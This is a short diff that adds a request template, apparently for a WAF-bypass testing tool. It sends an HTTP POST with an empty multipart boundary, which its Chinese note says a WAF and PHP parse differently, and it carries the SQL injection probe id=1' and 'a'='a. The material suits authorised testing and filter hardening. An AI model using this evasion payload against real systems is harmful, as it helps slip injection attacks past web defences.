@@ -1,0 +1,19 @@
+# @name: multipart空boundary
+# @tags: post,multipart,empty-boundary,php,id,bypass
+# @color: lavender
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_empty_boundary
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: Content-Type 中 boundary= 后为空值(并非分号后空格)，body 以空字符串作为 boundary 分隔。WAF 与 PHP 对空 boundary 的容错不同，可造成解析不一致。参考 do9gy multipart Part1 第8条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=
+
+--
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--
